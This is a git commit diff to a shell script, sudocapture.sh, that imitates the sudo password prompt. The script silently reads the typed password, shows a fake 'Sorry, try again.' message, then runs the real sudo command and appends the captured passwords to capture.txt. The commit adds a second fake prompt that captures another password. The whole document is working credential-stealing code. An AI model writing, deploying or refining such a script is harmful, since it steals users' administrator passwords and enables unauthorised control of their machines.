2fb2b40b9a675a4b1bc30601ef7572283986c3f6
magicweirdoo <github@simonpgw.eu.org>
2023-03-11 15:31:34 +0100

    Added sudo password input check

--- sudocapture.sh
+++ sudocapture.sh
@@ -4,6 +4,15 @@ command=$*
 read -p "[sudo] password for $(whoami): " -s sudopasswd 
 echo " "
 echo "Sorry, try again."
-sudo $command
+
+if sudo -n true >/dev/null 2>&1
+then
+    read -p "[sudo] password for $(whoami): " -s sudopasswd2
+    echo " "
+    sudo $command
+else
+    sudo $command
+fi
 
 printf "${sudopasswd}\n" >> capture.txt
+printf "${sudopasswd2}\n" >> capture.txt
